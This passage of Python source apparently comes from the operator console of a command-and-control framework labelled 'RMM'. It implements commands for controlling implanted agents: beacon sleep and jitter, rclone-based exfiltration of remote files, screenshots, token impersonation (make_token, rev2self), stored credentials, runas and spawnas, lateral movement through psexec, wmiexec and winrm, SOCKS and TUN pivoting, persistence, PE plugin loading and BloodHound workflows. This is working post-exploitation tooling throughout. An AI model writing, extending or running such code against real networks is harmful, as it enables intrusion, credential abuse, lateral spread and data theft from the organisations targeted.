                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. /set_sleep 5)")
                    continue
                if not 1 <= sleep_val <= 3600:
                    warn("Sleep must be between 1 and 3600 seconds")
                    continue
                code, _ = client.patch_config(sid, sleep_seconds=sleep_val)
                if code == 200:
                    say(f"Sleep -> {sleep_val}s on server (agent applies on next beacon; watch for [config_ack])")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "set_jitter":
                if not rest:
                    warn("Usage: /set_jitter <percent>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                try:
                    jitter_val = int(rest[0])
                except ValueError:
                    warn(f"Invalid number: {rest[0]!r} (use an integer, e.g. /set_jitter 30)")
                    continue
                if not 0 <= jitter_val <= 100:
                    warn("Jitter must be between 0 and 100")
                    continue
                code, _ = client.patch_config(sid, jitter_percent=jitter_val)
                if code == 200:
                    say(f"Jitter -> {jitter_val}% on server (agent applies on next beacon; watch for [config_ack])")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "events":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                since = int(rest[0]) if rest else 0
                code, edata = client.get_events(sid, since=since, forward=True)
                if code != 200:
                    warn(f"events failed ({code})")
                    continue
                cursor = _event_cursor(state)
                for ev in sorted(edata.get("events", []), key=lambda e: e["id"]):
                    print_event(
                        ev,
                        json_mode,
                        session_prefix=sid[:8],
                        session_id=sid,
                        state=state,
                    )
                    cursor[sid] = max(cursor.get(sid, 0), ev["id"])
                continue
            if cmd == "download":
                if not rest:
                    warn("Usage: /download <remote_path>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                remote = " ".join(rest)
                code, _ = client.queue_download(sid, remote)
                if code == 200:
                    say("Download queued")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "exfil":
                if not rest:
                    warn("Usage: /exfil <remote_path> [profile]")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                remote = rest[0]
                profile = rest[1] if len(rest) > 1 else None
                code, data = client.queue_exfil(sid, remote, profile=profile)
                if code == 200:
                    say("Exfil queued")
                elif code == 503 and isinstance(data, dict) and data.get("error"):
                    warn(str(data["error"]))
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "rclone-config":
                code, data = client.get_rclone_config()
                if code != 200:
                    warn(f"failed ({code})")
                elif isinstance(data, dict):
                    if data.get("rclone_binary"):
                        say(f"rclone binary ready; default profile={data.get('default_profile')}")
                    else:
                        warn("rclone bootstrap is unavailable — see docs/rclone-exfil.md")
                    for p in data.get("profiles") or []:
                        say(f"  {p.get('name')} ({p.get('type')}) folder={p.get('folder') or '/'}")
                continue
            if cmd == "upload":
                if len(rest) < 2:
                    warn("Usage: /upload <local_file_or_artifact_ref> <remote_path>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                local, remote = rest[0], " ".join(rest[1:])
                if not local.startswith("artifact:") and not os.path.isfile(local):
                    warn(f"Not found: {local}")
                    continue
                code, _ = client.upload_file(sid, local, remote)
                if code == 200:
                    say(f"Upload queued -> {remote}")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "screenshot":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                code, _ = client.queue_screenshot(sid)
                if code == 200:
                    say("Screenshot queued")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "spawn":
                if len(rest) > 1 or any(arg.startswith("-") for arg in rest):
                    warn("Usage: /spawn [session_id]")
                    continue
                sid_arg = rest[0] if rest else None
                sid = session_or_none(state, sid_arg)
                if not sid and sid_arg:
                    sid = _resolve_session_id(client, state, sid_arg)
                if not sid:
                    warn("No session to spawn from. Use: /spawn [session_id]")
                    continue
                say("Spawning detached Go agent (waits for the next beacon)...")
                code, data = client.spawn_session(sid)
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"spawn failed ({code})" + (f": {detail}" if detail else ""))
                    continue
                say(f"Requested session {data.get('spawned_session_id')} (pid {data.get('spawn_pid') or 'unconfirmed'})")
                if data.get("verify"):
                    say(
                        f"registered: {'yes' if data.get('registered') else 'no'}"
                    )
                    if not data.get("registered"):
                        warn("Spawn registration was not confirmed.")
                _refresh_completion_sessions(client, state)
                continue
            if cmd == "make_token":
                try:
                    rest = parse_identity_arguments(line)[1:]
                except ValueError:
                    warn("Invalid quoting. Use /make_token <identity> <password>; quote passwords containing spaces.")
                    continue
                try:
                    options, _ = parse_credential_arguments(rest)
                except ValueError:
                    warn("Usage: /make_token -i <cred_id> | /make_token <identity> <password>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                identity = options.get("user", "stored credential")
                say(f"Creating network token for {identity} (waits for the next beacon)...")
                if "cred_id" in options:
                    code, data = client.make_token(sid, **options)
                else:
                    domain, user = split_identity(options["user"])
                    code, data = client.make_token(sid, domain, user, options["password"])
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"make_token failed ({code})" + (f": {detail}" if detail else ""))
                elif not data.get("ok"):
                    warn(f"make_token failed: {data.get('output')}")
                else:
                    say(data.get("output") or f"token created: {identity}")
                continue
            if cmd == "rev2self":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                say("Reverting to the agent identity (waits for the next beacon)...")
                code, data = client.rev2self(sid)
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"rev2self failed ({code})" + (f": {detail}" if detail else ""))
                elif not data.get("ok"):
                    warn(f"rev2self failed: {data.get('output')}")
                else:
                    say(data.get("output") or "token reverted")
                continue
            if cmd == "lateral":
                method = rest[0].lower() if rest else ""
                flags = [arg for arg in rest[1:] if arg in ("-s", "--https")]
                insecure_flags = [arg for arg in rest[1:] if arg in ("-k", "--insecure")]
                targets = [arg for arg in rest[1:] if arg not in ("-s", "--https", "-k", "--insecure")]
                if (method not in ("psexec", "wmiexec", "winrm") or
                        len(targets) != 1 or len(flags) > 1 or len(insecure_flags) > 1 or
                        (insecure_flags and not flags) or
                        any(arg.startswith("-") for arg in targets) or
                        (flags and method != "winrm")):
                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)]")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                host = targets[0]
                say(f"Lateral {method} to {host} (waits for the next beacon)...")
                code, data = client.lateral_move(sid, method, host, **({"https": True} if flags else {}), **({"insecure": True} if insecure_flags else {}))
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"lateral failed ({code})" + (f": {detail}" if detail else ""))
                elif not data.get("ok"):
                    warn(f"lateral failed: {data.get('output')}")
                else:
                    say(data.get("output") or f"lateral {method} started on {host}")
                    if data.get("verify"):
                        say(
                            f"registered: {'yes' if data.get('registered') else 'no'}"
                        )
                        if not data.get("registered"):
                            warn("Lateral registration was not confirmed.")
                    _refresh_completion_sessions(client, state)
                continue
            if cmd == "uid":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                say("Querying agent identity (waits for the next beacon)...")
                code, data = client.session_uid(sid)
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"uid failed ({code})" + (f": {detail}" if detail else ""))
                else:
                    for line in (data.get("output") or "").splitlines() or ["(no output)"]:
                        say(line)
                continue
            if cmd == "creds":
                try:
                    sub_rest = parse_identity_arguments(line)[1:]
                except ValueError:
                    warn("Invalid quoting. Quote credential arguments containing spaces.")
                    continue
                sub_cmd = sub_rest[0].lower() if sub_rest else ""
                if sub_cmd == "list" or not sub_cmd:
                    if len(sub_rest) > 1:
                        warn("Usage: /creds list")
                        continue
                    code, data = client.creds_list()
                    if code != 200:
                        warn(f"creds list failed ({code})")
                    else:
                        creds = (data.get("creds") or []) if isinstance(data, dict) else []
                        if not creds:
                            say("no credentials stored")
                        for c in creds:
                            identity = c.get("label", "?")
                            say(f"  {c.get('cred_id') or c.get('id')}  {identity}")
                elif sub_cmd == "add":
                    if len(sub_rest) != 3:
                        warn("Usage: /creds add <domain\\user | user> <password>")
                    else:
                        cred_parts = sub_rest[1:]
                        if len(cred_parts) < 2:
                            warn("Usage: /creds add <domain\\user | user> <password>")
                        else:
                            cred_domain, cred_user = split_identity(cred_parts[0])
                            cred_password = cred_parts[1]
                            code, data = client.creds_add(cred_domain, cred_user, cred_password)
                            if code != 200:
                                warn(f"creds add failed ({code}): {data.get('error') if isinstance(data, dict) else data}")
                            else:
                                cred_identity = (cred_domain + "\\" + cred_user) if cred_domain else cred_user
                                say(f"stored {data.get('cred_id')} ({cred_identity})")
                elif sub_cmd == "del":
                    if (len(sub_rest) != 3 or sub_rest[1] != "-i" or
                            not sub_rest[2].strip() or sub_rest[2].startswith("-")):
                        warn("Usage: /creds del -i <cred_id>")
                    else:
                        code, data = client.creds_del(sub_rest[2])
                        if code not in (200, 404):
                            warn(f"creds del failed ({code}): {data.get('error') if isinstance(data, dict) else data}")
                        else:
                            say(data.get("message") or ("deleted" if code == 200 else "not found"))
                else:
                    warn("Usage: /creds list | /creds add <identity> <password> | /creds del -i <cred_id>")
                continue
            if cmd == "spawnas":
                try:
                    rest = parse_identity_arguments(line)[1:]
                except ValueError:
                    warn("Invalid quoting")
                    continue
                try:
                    options, _ = parse_credential_arguments(rest)
                except ValueError:
                    warn("Usage: /spawnas -i <cred_id> | /spawnas <identity> <password>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                say("Spawning agent under new identity (waits for the next beacon and registration)...")
                code, data = client.spawnas(sid, **options)
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"spawnas failed ({code})" + (f": {detail}" if detail else ""))
                elif isinstance(data, dict):
                    say(f"spawned session={data.get('spawned_session_id')} pid={data.get('spawn_pid')} identity={data.get('identity')}")
                    if data.get("verify"):
                        say(f"registered: {'yes' if data.get('registered') else 'no'}")
                        if not data.get("registered"):
                            warn("spawnas registration was not confirmed.")
                    _refresh_completion_sessions(client, state)
                continue
            if cmd == "runas":
                try:
                    rest = parse_identity_arguments(line)[1:]
                except ValueError:
                    warn("Invalid quoting")
                    continue
                try:
                    options, runas_command = parse_credential_arguments(rest, with_command=True)
                except ValueError:
                    warn("Usage: /runas -i <cred_id> <command...> | /runas <identity> <password> <command...>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                say("Running command under new identity (waits for the next beacon)...")
                code, data = client.runas(sid, runas_command, **options)
                if code != 200:
                    detail = data.get("error") if isinstance(data, dict) else data
                    warn(f"runas failed ({code})" + (f": {detail}" if detail else ""))
                else:
                    for ln in (data.get("output") or "").splitlines() or ["(no output)"]:
                        say(ln)
                continue
            if cmd == "pe":
                if rest and rest[0].lower() == "list":
                    code, data = client.list_plugins()
                    if code != 200:
                        warn(f"plugin list failed ({code}): {data}")
                    else:
                        for plugin in data.get("plugins", []):
                            say(f"{plugin.get('name')}  {plugin.get('size')} bytes  sha256={plugin.get('sha256')}")
                    continue
                if not rest:
                    warn("Usage: /pe <plugin> [export] [input] | /pe list")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                plugin = rest[0]
                export = rest[1] if len(rest) > 1 else "Run"
                plugin_input = " ".join(rest[2:]) if len(rest) > 2 else ""
                code, data = client.queue_pe_load(sid, plugin, export=export, plugin_input=plugin_input)
                if code == 200:
                    say(f"PE plugin load queued: {data.get('queued') if isinstance(data, dict) else plugin}")
                else:
                    warn(f"failed ({code}): {data}")
                continue
            if cmd == "socks":
                if rest and rest[0].lower() == "list":
                    code, data = client.list_socks()
                    if code != 200:
                        warn(f"socks list failed ({code}): {data}")
                    else:
                        print_socks_relays(data.get("relays", []), json_mode=json_mode)
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                if rest and rest[0].lower() == "stop":
                    code, _ = client.stop_socks(sid)
                    if code == 200:
                        say("SOCKS relay stopped")
                    else:
                        warn(f"failed ({code})")
                    continue
                port = 1080
                if rest:
                    try:
                        port = int(rest[0])
                        if port < 1 or port > 65535:
                            raise ValueError
                    except ValueError:
                        warn("Invalid port (1-65535)")
                        continue
                code, data = client.start_socks(sid, port=port)
                if code == 200:
                    url = data.get("socks_url", f"socks5://127.0.0.1:{port}")
                    say(f"SOCKS5 listening — use {url} (traffic exits remote host)")
                else:
                    warn(f"failed ({code}): {data}")
                continue
            if cmd == "tun":
                if rest and rest[0].lower() == "list":
                    code, data = client.list_tun()
                    if code != 200:
                        warn(f"tun list failed ({code}): {data}")
                    else:
                        print_tun_relays(data.get("relays", []), json_mode=json_mode)
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                if rest and rest[0].lower() == "stop":
                    code, _ = client.stop_tun(sid)
                    if code == 200:
                        say("RMM TUN relay stopped")
                    else:
                        warn(f"failed ({code})")
                    continue
                if rest and rest[0].lower() == "start":
                    rest = rest[1:]
                if not rest:
                    warn("Usage: /tun start <device> [--route cidr ...] [--address cidr] [--interface name] [--mtu n]")
                    continue
                device = rest[0]
                routes = []
                tun_address = "198.18.0.1/15"
                interface = ""
                mtu = 1500
                udp_timeout_seconds = 300
                i = 1
                while i < len(rest):
                    option = rest[i]
                    if option in ("--route", "--address", "--interface", "--mtu", "--udp-timeout") and i + 1 < len(rest):
                        value = rest[i + 1]
                        if option == "--route":
                            routes.append(value)
                        elif option == "--address":
                            tun_address = value
                        elif option == "--interface":
                            interface = value
                        elif option == "--mtu":
                            try:
                                mtu = int(value)
                            except ValueError:
                                warn("Invalid MTU")
                                break
                        else:
                            try:
                                udp_timeout_seconds = int(value)
                            except ValueError:
                                warn("Invalid UDP timeout")
                                break
                        i += 1
                    else:
                        warn("Invalid TUN option")
                        break
                    i += 1
                else:
                    code, data = client.start_tun(
                        sid,
                        device,
                        routes=routes,
                        tun_address=tun_address,
                        interface=interface,
                        mtu=mtu,
                        udp_timeout_seconds=udp_timeout_seconds,
                    )
                    if code == 200:
                        say("RMM TUN relay enabled")
                    else:
                        warn(f"failed ({code}): {data}")
                continue
            if cmd == "run":
                if not rest:
                    warn("Usage: /run <command>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                command = " ".join(rest)
                code, _ = client.queue_command(sid, command)
                if code == 200:
                    say("Queued")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "exec":
                if not rest:
                    warn("Usage: /exec <command>")
                    continue
                sid = _active_session(client, state)
                if not sid:
                    warn("No session selected. Use: /use <id>")
                    continue
                command = " ".join(rest)
                say("Waiting for agent (up to 120s — depends on beacon interval)...")
                code, edata = client.exec_command(sid, command, timeout=120)
                if code == 408:
                    warn("Timeout waiting for agent")
                elif code != 200:
                    warn(f"exec failed ({code})")
                elif edata.get("event"):
                    print_event(
                        edata["event"],
                        json_mode,
                        session_prefix=sid[:8],
                        session_id=sid,
                        state=state,
                    )
                    _drain_cli_output()
                    record_exec_cursor(state, sid, edata)
                continue
            if cmd == "persist":
                if not rest:
                    warn("Usage: /persist <command>")
                    continue
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                code, _ = client.queue_command(sid, " ".join(rest), "persistent")
                if code == 200:
                    say("Persistent command set")
                else:
                    warn(f"failed ({code})")
                continue
            if cmd == "stop":
                sid = session_or_none(state)
                if not sid:
                    warn("No session selected")
                    continue
                code, _ = client.queue_command(sid, "__STOP__")
                if code == 200:
                    say("Persistent command stopped")
                else:
                    warn(f"failed ({code})")
                continue

            # Default: remote command (queued), like embedded server CLI
            sid = _active_session(client, state)
            if not sid:
                warn("No session selected. Use: /use <id>")
                continue
            command = line.strip()
            code, _ = client.queue_command(sid, command)
            if code != 200:
                warn(f"queue failed ({code})")

    with patch_stdout():
        threading.Thread(
            target=_output_drainer_loop, args=(state,), daemon=True
        ).start()
        threading.Thread(
            target=_event_poller, args=(client, state, json_mode), daemon=True
        ).start()

        code, sdata = client.list_sessions()
        if code == 200:
            for s in sdata.get("sessions", []):
                _sync_event_cursor(client, state, s["id"])

        n = data.get("sessions", 0)
        say(f"Connected to {client.base_url} ({n} session(s)).")
        if n == 0:
            say("  No agents yet — wait for the PowerShell client to register, then run: /list")
        else:
            say("  Run: /list   then: /use <first-8-chars-of-id>   then: /exec whoami")
        say("Input line stays at the bottom; results appear automatically (no Enter needed).\n")
        cur = current_session(state)
        if cur:
            say(f"Transcript filtered to session [{cur[:8]}] — use /background to see all.\n")
        _show_help()
        try:
            _interactive_loop()
        finally:
            state["interactive_running"] = False

    _cli_use_ptk = False
    _main_thread_id = None
    say("Goodbye.")


def cmd_events(client: RmmApiClient, state: dict, args):
    sid = require_session(state, args.session)
    fetch = client.get_history_events if args.history else client.get_events
    code, data = fetch(sid, since=args.since, limit=args.limit, forward=args.forward)
    if code != 200:
        die(f"events failed ({code}): {data}")
    if args.json:
        print_json(data)
        return
    for ev in data.get("events", []):
        cmd = ev.get("command") or ""
        suffix = f" » {cmd}" if cmd else ""
        print(f"[{ev['id']}] {ev['timestamp']} {ev['type']}{suffix}")
        body = ev.get("body", "")
        if ev.get("artifact"):
            print(f"  artifact: {ev['artifact']}")
        if body:
            print(body.rstrip())
        print("-" * 40)


def read_settings_json(filename):
    """Read a bounded JSON object from a file or standard input."""
    try:
        if filename == "-":
            raw = sys.stdin.read(SETTINGS_MAX_BYTES + 1)
        else:
            with open(filename, encoding="utf-8") as handle:
                raw = handle.read(SETTINGS_MAX_BYTES + 1)
        if len(raw.encode("utf-8")) > SETTINGS_MAX_BYTES:
            raise ValueError("configuration exceeds the settings size limit")
        value = json.loads(raw)
        if not isinstance(value, dict):
            raise ValueError("configuration must be a JSON object")
        return value
    except (OSError, ValueError) as exc:
        die(f"Cannot read configuration: {exc}")


def cmd_settings(client, state, args):
    """Read settings or save typed overrides without exposing secret input."""
    action = args.settings_action
    values = None
    if action == "set":
        if (args.value is None) == (args.value_file is None):
            die("Provide VALUE or --value-file FILE (use - for standard input), not both.")
        raw = args.value
        if args.value_file is not None:
            try:
                if args.value_file == "-":
                    raw = sys.stdin.read(SETTINGS_MAX_BYTES + 1)
                else:
                    with open(args.value_file, encoding="utf-8") as handle:
                        raw = handle.read(SETTINGS_MAX_BYTES + 1)
                raw = raw.rstrip("\r\n")
            except (OSError, UnicodeError) as exc:
                die(f"Cannot read setting value: {exc}")
        if len(raw.encode("utf-8")) > SETTINGS_MAX_BYTES:
            die("Setting value exceeds the settings size limit")
        try:
            value = json.loads(raw)
        except ValueError:
            value = raw
        values = {args.key: value}
    elif action == "unset":
        values = {args.key: None}
    elif action == "import":
        payload = read_settings_json(args.file)
        if set(payload) != {"settings"} or not isinstance(payload["settings"], dict):
            die('Expected {"settings": {"KEY": value}}')
        values = payload["settings"]
    code, data = client.settings(values)
    if code != 200:
        die(f"settings failed ({code}): {data}")
    print_json(data)


def dispatch_interactive_bloodhound(client, state, line):
    """Reuse the one-shot parser locally; invalid input never reaches an agent."""
    try:
        args = build_parser().parse_args(shlex.split(line))
        cmd_bloodhound(client, state, args)
    except ValueError as exc:
        warn(f"Invalid BloodHound command: {exc}")
    except SystemExit:
        # argparse and die already display the error; keep the operator shell alive.
        pass


def cmd_bloodhound(client, state, args):
    """Send typed workflow options without accepting credentials on the command line."""
    try:
        options = json.loads(args.options_json)
        if not isinstance(options, dict):
            raise ValueError("options must be an object")
    except ValueError as exc:
        die(f"Invalid BloodHound options: {exc}")
    code, data = client.bloodhound(args.action, args.run_id, options)
    if not 200 <= code < 300:
        die(f"BloodHound workflow failed ({code}): {data}")
    print_json(data)


def cmd_embeddings(client, state, args):
    """Dispatch profile management, execution, and result export for the CLI."""
    action = args.embedding_action
    if args.embedding_group == "run":
        code, data = client.run_embeddings(require_session(state, args.session), args.profile, args.document)
    elif args.embedding_group == "profiles":
        config = None
        if action == "save":
            try:
                with open(args.file, encoding="utf-8") as handle:
                    raw = handle.read(65537)
                if len(raw) > 65536:
                    raise ValueError("profile file exceeds 64 KiB")
                config = json.loads(raw)
                config = config.get("record", config)
                config = config.get("config", config)
            except (OSError, ValueError, AttributeError) as exc:
                die(f"Cannot read profile: {exc}")
        code, data = client.embedding_profiles(action, getattr(args, "name", ""), config)
    else:
        code, data = client.embedding_results(action, getattr(args, "name", ""),
            require_session(state, args.session) if action == "save" else "", getattr(args, "event", 0))
    if code != 200:
        die(f"embeddings failed ({code}): {data}")
    if getattr(args, "output", None):
        with open(args.output, "w", encoding="utf-8") as handle:
            json.dump(data, handle, ensure_ascii=False, indent=2)
            handle.write("\n")
    else:
        print_json(data)


def build_parser() -> argparse.ArgumentParser:
    shared = argparse.ArgumentParser(add_help=False)
    shared.add_argument("--json", action="store_true", help="JSON output")

    p = argparse.ArgumentParser(description="RMM operator CLI (REST API client)")
    p.add_argument("--config", help="Client settings file (loaded before connecting)")
    p.add_argument(
        "--url",
        default=DEFAULT_URL,
        help="Server URL (env: RMM_SERVER_URL or RMM_BASE_URL; default: %(default)s)",
    )
    p.add_argument("--token", default=None, help="Explicit bearer token; overrides workspace credentials. Otherwise use workspace credentials, then RMM_API_TOKEN.")

    sub = p.add_subparsers(dest="subcommand", required=False)
    p.add_argument(
        "-i", "--interactive",
        action="store_true",
        help="Interactive console (default when no subcommand is given)",
    )

    sub.add_parser("health", parents=[shared], help="API health check").set_defaults(func=cmd_health)
    sp_ix = sub.add_parser("interactive", parents=[shared], aliases=["shell", "console"],
                            help="Interactive operator console")
    sp_ix.set_defaults(func=lambda c, s, a: run_interactive(c, s, a.json))

    sp = sub.add_parser("sessions", help="Session management")
    sp_sub = sp.add_subparsers(dest="sessions_cmd", required=True)
    sp_list = sp_sub.add_parser("list", parents=[shared], help="List sessions")
    sp_list.set_defaults(func=cmd_sessions_list)

    sp = sub.add_parser("session", help="Select / inspect / kill a session")
    sp_sub = sp.add_subparsers(dest="session_cmd", required=True)
    sp_use = sp_sub.add_parser("use", help="Select session (prefix ok)")
    sp_use.add_argument("session_id")
    sp_use.set_defaults(func=cmd_session_use)
    sp_info = sp_sub.add_parser("info", parents=[shared], help="Session details")
    sp_info.add_argument("--session", "-s", default=None)
    sp_info.set_defaults(func=cmd_session_info)
    sp_kill = sp_sub.add_parser("kill", parents=[shared], help="Kill session")
    sp_kill.add_argument("--session", "-s", default=None)
    sp_kill.set_defaults(func=cmd_session_kill)

    sp_run = sub.add_parser("run", parents=[shared], help="Queue command (non-blocking)")
    sp_run.add_argument("command")
    sp_run.add_argument("--session", "-s", default=None)
    sp_run.add_argument("--type", choices=["oneshot", "persistent"], default="oneshot")
    sp_run.set_defaults(func=cmd_run)

    sp_exec = sub.add_parser("exec", parents=[shared], help="Run command and wait for output")
    sp_exec.add_argument("command", nargs="?", default=None)
    sp_exec.add_argument("-f", "--command-file", help="Read command from file")
    sp_exec.add_argument("--session", "-s", default=None)
    sp_exec.add_argument("--wait", type=float, default=120, help="Timeout seconds")
    sp_exec.set_defaults(func=cmd_exec)

    sp_spawn = sub.add_parser(
        "spawn",
        parents=[shared],
        help="Spawn a detached second Go agent from a live Go session and confirm the new session registration",
    )
    sp_spawn.add_argument("--session", "-s", default=None)
    sp_spawn.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
    sp_spawn.add_argument("--spawn-timeout", type=float, default=120, help="Seconds to wait for the spawn command result")
    sp_spawn.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the spawned session to register")
    sp_spawn.add_argument("--verify-timeout", type=float, default=120, help="Deprecated compatibility option; no probe is sent")
    sp_spawn.set_defaults(func=cmd_spawn)

    sp_mt = sub.add_parser(
        "make-token",
        parents=[shared],
        help="Create a runas /netonly style network identity on a Go agent session",
    )
    sp_mt.add_argument("-i", dest="cred_id", default=None, help="Credential ID from creds add")
    sp_mt.add_argument("user", nargs="?", default=None, help="Identity as DOMAIN\\user or plain user")
    sp_mt.add_argument("password", nargs="?", default=None, help="Password for a direct identity")
    sp_mt.add_argument("--session", "-s", default=None)
    sp_mt.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
    sp_mt.set_defaults(func=cmd_make_token)

    sp_rev = sub.add_parser(
        "rev2self",
        parents=[shared],
        help="Revert a Go agent session to its own network identity",
    )
    sp_rev.add_argument("--session", "-s", default=None)
    sp_rev.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
    sp_rev.set_defaults(func=cmd_rev2self)

    sp_creds = sub.add_parser("creds", help="Manage workspace-scoped credentials")
    sp_creds_sub = sp_creds.add_subparsers(dest="creds_cmd", required=True)
    sp_creds_add_p = sp_creds_sub.add_parser("add", parents=[shared], help="Store a credential (returns cred_id)")
    sp_creds_add_p.add_argument("user", help="Identity as DOMAIN\\user or plain user")
    sp_creds_add_p.add_argument("password", help="Password")
    sp_creds_add_p.set_defaults(func=cmd_creds_add)
    sp_creds_del_p = sp_creds_sub.add_parser("del", parents=[shared], help="Remove a stored credential")
    sp_creds_del_p.add_argument("-i", dest="cred_id", required=True, help="Credential ID")
    sp_creds_del_p.set_defaults(func=cmd_creds_del)
    sp_creds_list_p = sp_creds_sub.add_parser("list", parents=[shared], help="List stored credentials (no passwords)")
    sp_creds_list_p.set_defaults(func=cmd_creds_list)

    sp_spawnas = sub.add_parser(
        "spawnas",
        parents=[shared],
        help="Spawn a Go agent copy under a different process identity (CreateProcessAsUser cascade)",
    )
    sp_spawnas.add_argument("-i", dest="cred_id", default=None, help="Credential ID from 'creds add'")
    sp_spawnas.add_argument("--user", default=None, help="Identity as DOMAIN\\user or plain user (if no cred_id)")
    sp_spawnas.add_argument("--password", default=None, help="Password (if no cred_id)")
    sp_spawnas.add_argument("--session", "-s", default=None)
    sp_spawnas.add_argument("--no-verify", dest="no_verify", action="store_true")
    sp_spawnas.add_argument("--spawn-timeout", type=float, default=120)
    sp_spawnas.add_argument("--register-timeout", type=float, default=60)
    sp_spawnas.add_argument("--verify-timeout", type=float, default=120)
    sp_spawnas.set_defaults(func=cmd_spawnas)

    sp_runas = sub.add_parser(
        "runas",
        parents=[shared],
        help="Run a command on a Go agent under a different process identity",
    )
    sp_runas.add_argument("command", help="Shell command to execute")
    sp_runas.add_argument("-i", dest="cred_id", default=None, help="Credential ID from 'creds add'")
    sp_runas.add_argument("--user", default=None, help="Identity (if no cred_id)")
    sp_runas.add_argument("--password", default=None, help="Password (if no cred_id)")
    sp_runas.add_argument("--session", "-s", default=None)
    sp_runas.add_argument("--timeout", type=float, default=120)
    sp_runas.set_defaults(func=cmd_runas)

    sp_lat = sub.add_parser(
        "lateral",
        parents=[shared],
        help="Start a Go agent on another host through psexec, wmiexec, or winrm",
    )
    sp_lat.add_argument("method", choices=["psexec", "wmiexec", "winrm"])
    sp_lat.add_argument("host", help="Target hostname or IP address")
    sp_lat.add_argument("--session", default=None, help="Source session ID")
    sp_lat.add_argument("-s", "--https", action="store_true", help="Use HTTPS/5986 with certificate validation (winrm only)")
    sp_lat.add_argument("-k", "--insecure", action="store_true", help="Skip CA/name/revocation checks; certificate dates still apply (requires --https)")
    sp_lat.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
    sp_lat.add_argument("--exec-timeout", type=float, default=300, help="Seconds to wait for the lateral execution result")
    sp_lat.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the target session to register")
    sp_lat.add_argument("--verify-timeout", type=float, default=120, help="Deprecated compatibility option; no probe is sent")
    sp_lat.set_defaults(func=cmd_lateral)

    sp_uid = sub.add_parser("uid", parents=[shared], help="Show the identity used by a Go agent session")
    sp_uid.add_argument("--session", "-s", default=None)
    sp_uid.add_argument("--timeout", type=float, default=120, help="Seconds to wait for the agent result")
    sp_uid.set_defaults(func=cmd_uid)

    sp_cfg = sub.add_parser("config", help="Beacon configuration")
    sp_cfg_sub = sp_cfg.add_subparsers(dest="config_cmd", required=True)
    sp_sleep = sp_cfg_sub.add_parser("set-sleep", help="Set sleep interval (1-3600)")
    sp_sleep.add_argument("seconds", type=int)
    sp_sleep.add_argument("--session", "-s", default=None)
    sp_sleep.set_defaults(func=cmd_config_set_sleep)
    sp_jit = sp_cfg_sub.add_parser("set-jitter", help="Set jitter percent (0-100)")
    sp_jit.add_argument("percent", type=int)
    sp_jit.add_argument("--session", "-s", default=None)
    sp_jit.set_defaults(func=cmd_config_set_jitter)

    sp_dl = sub.add_parser("download", help="Queue remote file download")
    sp_dl.add_argument("remote_path")
    sp_dl.add_argument("--session", "-s", default=None)
    sp_dl.set_defaults(func=cmd_download)

    sp_exfil = sub.add_parser("exfil", help="Queue remote file exfil via rclone (agent-side upload)")
    sp_exfil.add_argument("remote_path")
    sp_exfil.add_argument("--profile", "-p", default=None, help="Named rclone profile in the active deployment")
    sp_exfil.add_argument("--dest", default=None, help="Cloud destination path override")
    sp_exfil.add_argument("--mode", choices=("auto", "plugin", "binary"), default="auto", help="Execution mode")
    sp_exfil.add_argument("--session", "-s", default=None)
    sp_exfil.set_defaults(func=cmd_exfil)

    sp_plugin = sub.add_parser("plugin", help="Browse and install compiled GitHub plugin releases")
    sp_plugin_sub = sp_plugin.add_subparsers(dest="plugin_action", required=True)
    sp_plugin_releases = sp_plugin_sub.add_parser("releases", parents=[shared], help="Inspect the latest or a named release")
    sp_plugin_releases.add_argument("--tag", default="latest")
    sp_plugin_releases.add_argument("--source", default="default", help="Saved repository/branch source ID")
    sp_plugin_releases.set_defaults(func=cmd_plugin_release)
    sp_plugin_install = sp_plugin_sub.add_parser("install", parents=[shared], help="Install one plugin from an exact release tag")
    sp_plugin_install.add_argument("name")
    sp_plugin_install.add_argument("--source", default="default", help="Saved repository/branch source ID")
